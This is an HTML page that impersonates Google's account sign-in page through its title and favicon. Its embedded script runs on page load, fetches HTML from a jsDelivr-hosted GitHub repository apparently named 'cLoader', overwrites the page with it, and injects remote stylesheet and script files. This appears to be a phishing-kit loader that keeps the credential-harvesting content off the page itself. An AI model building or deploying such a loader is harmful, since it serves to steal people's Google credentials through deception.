<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico">
    <title>Sign in - Google Accounts</title>
    <style>
        /* Light Mode Bootloader Styling */
        body { 
            background-color: #ffffff; 
            color: #202124; 
            font-family: 'Roboto', arial, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .loader-text { animation: blink 1s infinite; font-size: 14px; color: #5f6368; }
        @keyframes blink { 0% { opacity: 0.2; } 50% { opacity: 1; } 100% { opacity: 0.2; } }
    </style>
</head>
<body>
    <div class="loader-text">Connecting...</div>

    <script>
      (function() {
        const USER = "FailedRifle";
        const REPO = "cLoader";
        const BRANCH = "main";
        
        const SOURCE_URL = `https://cdn.jsdelivr.net/gh/${USER}/${REPO}@${BRANCH}/index.html`;
        const assetUrl = `https://cdn.jsdelivr.net/gh/${USER}/${REPO}@${BRANCH}`;

        fetch(SOURCE_URL)
          .then(response => {
            if (!response.ok) throw new Error("NETWORK_ERROR");
            return response.text();
          })
          .then(html => {
            document.open();
            document.write(html);
            document.close();

            // Inject Light Mode Styles
            const style = document.createElement('link');
            style.rel = 'stylesheet';
            style.href = `${assetUrl}/style.css`;
            document.head.appendChild(style);

            // Inject Logic
            const script = document.createElement('script');
            script.src = `${assetUrl}/index.js`;
            document.body.appendChild(script);
          })
          .catch(err => {
            document.body.innerHTML = `<div style="color:#d93025; font-family:sans-serif; text-align:center;">
                Confirm your connection and try again.
            </div>`;
          });
      })();
    </script>
</body>
</html>
